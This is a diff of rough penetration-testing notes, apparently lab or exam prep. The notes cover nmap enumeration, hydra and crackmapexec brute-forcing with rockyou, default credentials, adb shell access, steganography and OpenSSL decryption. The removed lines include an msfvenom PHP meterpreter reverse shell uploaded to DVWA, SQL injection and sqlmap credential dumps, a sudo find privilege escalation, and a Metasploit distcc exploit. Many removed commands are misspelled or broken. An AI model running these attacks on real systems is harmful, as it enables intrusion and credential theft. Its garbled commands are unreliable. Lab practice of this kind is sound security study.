@@ -1,189 +1,271 @@
-nmap -p 389 --script ldap-rootdse x.x.x.x
-nmap --script smb-os-discovery x.x.x.x
-nmap -sV x.x.x.x
-
-nmap -sv --script http-title, http-server-header x.x.x.x
-nmap -sV x.x.x.x. | grep -i apache
-nmap -p 445 --open x.x.x.x
-nmap --script smb-os-discovery, smb-enum-shares x.x.x.x
-hydra -l user -P path smb://x.x.x.x
-smbclient -L //x.x.x.x/ -U user
-smbclient //x.x.x.x/share -u user
-get file.txt
-cat file.txt
-
-base64 -d file.txt >decoded.bin
-openssl enc -d -aes-256-cbc -in decoded.bin -out file.txt
-openssl enc -d -aes-256-cbc -in file.txt
-
-nmap -sV x.x.x.x --open
-adbconnect x.x.x.x:5555
-adbshell
-adbpull path
-find / -name "*.elf" 2>dev/null
-sha384sum file.elf
-
-OpenVAS
-gvm-start  
-https://172.0.0.1:9392
-scans - tasks
-search
-
-port 3632 open
-nmap -sV x.x.x.x --open
-msfconsole 
-use exploit/unix/misc/distcc_exec
-set rhost x.x.x.x
-run
-find / -name file.txt 2>dev/null
-cd ./home/user/file.txt
-
-If port 22
-nmap -sV x.x.x.x --open
-hydra -l user -P path ssh://x.x.x.x
-ssh user@x.x.x.x 
-find / -name file.txt 2>dev/null
-cd ./home/user/file.txt
-
-cd ./downloads
-file image.png
-strings image.png | less
-steghide extract -sf image.png
-ls
-cat
-binwalk -e image.jpg 
-ls -image.png.extracted/
-strings image.png | grep -i flag
-
-nmap -p 21 x.x.x.x
-nmap -sV -p x.x.x.x 
-ftp x.x.x.x
-hydra -L users -P pass ftp://x.x.x.x
-ftp x.x.x.x
-ls
-get file.txt
-bye
-cat file.txt
-
-nmap -sV x.x.x.x -- open
-ssh user@x.x.x.x
-sudo -l
-sudo su 
-whoami
-sudo find . -exec/bin/bash\;quit
-find / -name file.txt 2>dev/null
-
-horizontal 
-sudo -i
-cd/home/user2
-ls
-cat file.txt
-sudo -u user2 /bin/bash
-user2: whoami
-user2
-ls 
-fie.txt
-
-Vertical escalation
-after the horizontal escalation
-ls -la
-cd .ssh
-ls
-id_rsa
-cat id_isa
-nano id_rsa
-chmod 600 id_rsa
-ssh root@x.x.x.x -P xxxxx -i id_rsa
-
-shared folder ./shared
-xfreerdp rdp /u: /p: /v: /drive:shared, ./shared
-on windows  open thispc
-shared on tsclient
-
-SMB share 
-pytrhon3 -m http.server 8000
-
-suso su 
-mkdir /var/www/html/share
-cp file.txt /var/www/html/share
-service apache2 start 
-ipconfig/share
-
-hide.cfe 
-rename hide.cfe(hide.zip)
+Host Discovery
+ nmap -sn 192.168.56.0/24
+ nmap -sS -sV -sC -O -Pn 192.168.56.0/24
+Use SMB Enumeration
+ nmap --script smb-os-discovery 192.168.56.10
+ nmap --script smb-os-discovery,smb-protocols 192.168.56.10
+ nmap -p 139,445 --open 192.168.0.0/24
+DNS Enumeration
+ nslookup 192.168.56.10
+ dig -x 192.168.56.10
+Update Nmap scripts
+ sudo nmap --script-updatedb
+all-in-one enumeration scan
+ nmap -A -T4 192.168.56.0/24
+ nmap -A --script smb-os-discovery 192.168.56.10
+anonymous
+SMB Banner Grabbing
+ smbclient -L //192.168.56.10 -N
+RPC enumeration
+ rpcclient -U "" -N 192.168.56.10
+ srvinfo
+ quit
+LDAP Enumeration
+ ldapsearch -x -H ldap://192.168.56.10 -s base
+common web ports - wamp - Apache
+ nmap -sV -p 80,443,8080,8081 192.168.56.0/24
+Check the Web Page
+ http://192.168.56.20
+ curl -I http://192.168.56.20
+ whatweb http://192.168.56.20
+ nikto -h http://192.168.56.20
+common web ports - mercury
+ nmap -sV -p 25,79,106,110,143,2222 192.168.56.20
+ nmap -sV -A -p- 192.168.56.20
+Base64/XOR/OpenSSL/Vigenère-style encoding
+nmap -p 139,445 --open 192.168.0.0/24
+nmap --script smb-os-discovery,smb-enum-shares 192.168.0.15
+smbclient -L //192.168.0.15 -N
+hydra -l Henry -P /usr/share/wordlists/rockyou.txt smb://192.168.0.15
+crackmapexec smb 192.168.0.15 -u Henry -p /usr/share/wordlists/rockyou.txt
+smbclient //192.168.0.15/ShareName -U Henry
+get Sniff.txt
+exit
+cat Sniff.txt
+Decode the Secret
+ base64 -d Sniff.txt
+Decrypt using Henry’s password: -a → Base64 encoded
+ openssl enc -aes-256-cbc -d -a -in Sniff.txt -k password123
+nmap -p 139,445 --open 192.168.0.0/24
+hydra -l Henry -P /usr/share/wordlists/rockyou.txt smb://192.168.0.15
+smbclient //192.168.0.15/Share -U Henry
+smbclient -L //192.168.0.15 -U Henry
+get Sniff.txt
+openssl enc -aes-256-cbc -d -a -in Sniff.txt -k password123
+---
+Discover RDP Hosts
+nmap -p 3389 --open 10.10.55.0/24
+Enumerate RDP Service
+nmap -sV -A -p 3389 10.10.55.25
+hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://10.10.55.25
+xfreerdp /u:Jones /p:sunshine /v:10.10.55.25
+dir /s hide.cfe
+SMB copy
+smbclient //10.10.55.25/Share -U Jones
 file hide.cfe
-mv hide.cfe hide.zip
+7z x hide.cfe
+or mv hide.cfe hide.zip
 unzip hide.zip
-crc32 image,.png(7z h image.png)
+OpenSSL Decryption
+openssl enc -aes-256-cbc -d -in hide.cfe -out image.jpg -k sunshine
+binwalk hide.cfe
+Calculate CRC32
+sudo apt install libarchive-zip-perl
+crc32 image.jpg
+nmap -p 3389 --open 10.10.55.0/24
+hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://10.10.55.25
+xfreerdp /u:Jones /p:sunshine /v:10.10.55.25
+7z x hide.cfe
+crc32 image.jpg
+---
+nmap -sV -O -p- 192.168.0.0/24
+adb connect 192.168.0.25:5555
+adb devices
+adb shell
+find / -type d -name "Scan" 2>/dev/null
+ls -lah /sdcard/Scan
+file /sdcard/Scan/*
+mkdir elf_files
+adb pull /sdcard/Scan ./elf_files
+sudo apt install ent
+ent elf_files/*
+binwalk -E elf_files/*
+sha384sum elf_files/malware1;
+nmap -sV -O -p- 192.168.0.0/24
+adb connect 192.168.0.25:5555
+adb shell
+find / -type d -name Scan
+adb pull /sdcard/Scan ./elf_files
+ent elf_files/*
+sha384sum elf_files/malware1
+---
+nmap -sV -O -p- 10.10.55.0/24
+adb connect 10.10.55.20:5555
+adb devices
+adb shell
+find /sdcard -type f \( -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null
+adb pull /sdcard/DCIM/secret.jpg
+file secret.jpg
+exiftool secret.jpg  ->Check Metadata
+strings secret.jpg   ->Run Strings Analysis
+binwalk secret.jpg   ->Check for Embedded Files
+binwalk -e secret.jpg   ->Extract Embedded Data
+steghide extract -sf secret.jpg;
+nmap -sV -O -p- 10.10.55.0/24
+adb connect 10.10.55.20:5555
+adb pull /sdcard/DCIM/secret.jpg
+exiftool secret.jpg
+strings secret.jpg
+binwalk -e secret.jpg
+steghide extract -sf secret.jpg
+---
+nmap -sV -A 172.20.0.16   -->This indicates an outdated PHP version(X-Powered-By: PHP/5.6.40/80/tcp open http Apache httpd 2.4.54
+|_http-generator: PHP/5.6.40)
+Scan 172.20.0.16      -->Using Nessus --Create a basic network scan targeting
+PHP Unsupported Version Detection or PHP 5.x End of Life Detection   -->Identify EOL Vulnerability
+Scan 172.20.0.16      -->Alternative with OpenVAS  --Create a full and fast scan for target
+curl -I http://172.20.0.16   -->Useful Enumeration Commands 
+whatweb http://172.20.0.16   -->Detect Web Technologies
+Focus specifically on: End of Life/Unsupported Version/Obsolete Platform
+For Missing Hidden Headers: whatweb / curl -I / nmap -sV   ->>to identify the technology stack
+nmap -sV -A 172.20.0.16
+whatweb http://172.20.0.16
+---
+nmap -sV -A 192.168.44.32
+Open the report: Sort by: CVSS score/Severity
+looking for: The SMALLEST CVSS value
+Nessus Workflow/Inside Nessus:
+ Open scan report
+ Click “Vulnerabilities”
+ Sort by “Severity”
+ Open lowest-scoring item
+ Record CVE
+NB: Vulnerabilities with Low Scores:
+ Clickjacking
+ Missing HTTP headers
+ Information disclosure
+ Weak SSL ciphers
+ TRACE method enabled
+NSE Vulnerability Scripts
+ nmap --script vuln 192.168.44.32
+HTTP Vulnerability Scan
+ nikto -h http://192.168.44.32
+---
+nmap -sV -sC -O 192.168.0.0/24
+Identify Remote Login ServicesPort	Service
+22	SSH
+23	Telnet
+512	rexec
+513	rlogin
+514	rsh
+Attempt Anonymous or Weak Access
+telnet 192.168.0.15
+  admin:admin
+  root:toor
+  test:test ____
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.15
+hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://192.168.0.15
+ssh root@192.168.0.15
+telnet 192.168.0.15
+find / -name "NetworkPass.txt" 2>/dev/null
+cat /home/admin/NetworkPass.txt  _____
+Using Metasploit
+msfconsole
+search telnet
+search ssh
+nmap -sV -sC -O 192.168.0.0/24
+hydra -l root -P rockyou.txt ssh://192.168.0.15
+ssh root@192.168.0.15
+find / -name NetworkPass.txt 2>/dev/null
+find / -iname "*pass*" 2>/dev/null
+cat /home/admin/NetworkPass.txt
+--- Telnet/rlogin/rsh
+nmap -sV -sC -O 10.10.55.0/24
+22	SSH
+23	Telnet
+512	rexec
+513	rlogin
+514	rsh
+Try Default/Weak Credentials
+ssh admin@10.10.55.20
+common passwords:
+admin
+password
+toor
+123456
+Brute Force Credentials:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.55.20
+hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.55.20
+ssh admin@10.10.55.20
+telnet 10.10.55.20
+find / -name "Netnormal.txt" 2>/dev/null
+cat /home/admin/Netnormal.txt
+Alternative Enumeration
+nmap -p- -sV 10.10.55.20
+nmap --script auth,vuln 10.10.55.20;
+nmap -sV -sC -O 10.10.55.0/24
+hydra -l admin -P rockyou.txt ssh://10.10.55.20
+ssh admin@10.10.55.20
+find / -name Netnormal.txt 2>/dev/null
+cat /home/admin/Netnormal.txt
+---
+digital forensics + steganography
+Verify File Type: file "My Trip.jpg"
+Check Metadata: exiftool "My Trip.jpg"
+Run Strings Analysis: strings "My Trip.jpg"
+Check for Embedded Files: binwalk "My Trip.jpg"
+Extract Embedded Data: binwalk -e "My Trip.jpg"
+Use Steghide: steghide extract -sf "My Trip.jpg"
+Read the Hidden Data: cat secret.txt
+Alternative Possibilities:
+mv "My Trip.jpg" trip.zip
+unzip trip.zip
+Foremost Extraction: foremost "My Trip.jpg"
+Workflow:
+file "My Trip.jpg"
+exiftool "My Trip.jpg"
+strings "My Trip.jpg"
+binwalk -e "My Trip.jpg"
+steghide extract -sf "My Trip.jpg"
+cat secret.txt
+NB: zsteg is mainly for PNG/BMP files.
+NB: steghide/binwalk for JPG are better choices.
+---
+forensics + hidden data extraction
+ Identify File Type: file restricted.txt
+Inspect the Contents: cat restricted.txt
+Look for patterns such as:
+Pattern	Meaning
+U2FsdGVkX1	OpenSSL encrypted
+UEsDB	ZIP archive
+Ends with =	Base64
+Hex chars	Hex encoding
+Run Strings Analysis: strings restricted.txt
+base64 -d restricted.txt
+If file starts with: Salted__/U2FsdGVkX1
+openssl enc -aes-256-cbc -d -a -in restricted.txt -k password
+If file shows ZIP/RAR/7z: 
+unzip restricted.txt
+7z x restricted.txt
+Use Binwalk:
+Check for embedded content: binwalk restricted.txt
+Extract: binwalk -e restricted.txt
+If content looks hexadecimal: xxd -r -p restricted.txt
+Mostly correct path is: openssl enc -aes-256-cbc -d -a -in restricted.txt -k password   or   7z x restricted.txt;
+file restricted.txt
+cat restricted.txt
+strings restricted.txt
+openssl enc -aes-256-cbc -d -a -in restricted.txt -k password
+Best Initial Commands:
+file restricted.txt
+strings restricted.txt
+binwalk restricted.txt
+Then try:
+openssl enc -aes-256-cbc -d -a -in restricted.txt -k password
+---
 
 
-powershell(Get-filehash -Algorithm SHA256 .\file.txt)
-
-exiftool image.png
-namp --script vuln x.x.x.x
-
-Malware analysis (PES analysis & DIE)
-objdump -f file.exe
-readpe -h file.exe
-
-File open .pcap 
-id.dst==x.x.x.x
-statisfics endpoints(conversation)
-' 'OR '1'='1 'OR 1=1--
-sqlmap -u "url" --dbs -D xxxx --tables xxxx -T xxxx -C username, password --dump
-
-app webapp analysis burpsuite 
-temporary project next start burp 
-proxy open browser
-proxy intercept on 
-on burp browser url
-forward request 
-after finding vulnerable parameters
-send to repeater then manual SQL injection 
-id=1 id=1' if response sql syntax, MySQL, database error 
-save item
-req.txt 
-sqlmap -r req.txt --dump --batch --crawl=2
-mqtt.msgtype==3 for publish packets
-
-aircrack-ng .cap
-aircrack-ng .cap -w rockyou.txt
-aircrack-ng -b <BSSID> -w rockyou.txt .cap
-
-cd ./Documents
-ls
-cat .txt
-if md5
-hashcat -m 0 .txt /rockyou.txt
-john --wordlist=[path_to_wordlist] [file_path] --format=raw-md5<hash>
-hashid file.txt
-
-apt install ent 
-ent evil.elf
-sha384sum evil.elf
-
-grep -i "php\|unsupported\|eol" vulnscan.txt
-
-DVWA/HACKABLE/UPLOADS
-
-msfvenom -p php/meterpreter/reverse_tcp lhost=.x.x.x.x lport=xxx -o shell.php
-msfconsole -x "use exploit/multihandler; set lhost x.x.x.x; set lport xxx; run"
-set payload /pp/meterpreter/reverse_tcp
-run
-upload shell.php on dvwa
-access url
-
-sqlmap -r .txt -D dvwa --dump 
-wpscan --url http://http://x.x.x.x. --enumerate U
 
 
 
 
-
-
-
-
-
-
-
- 
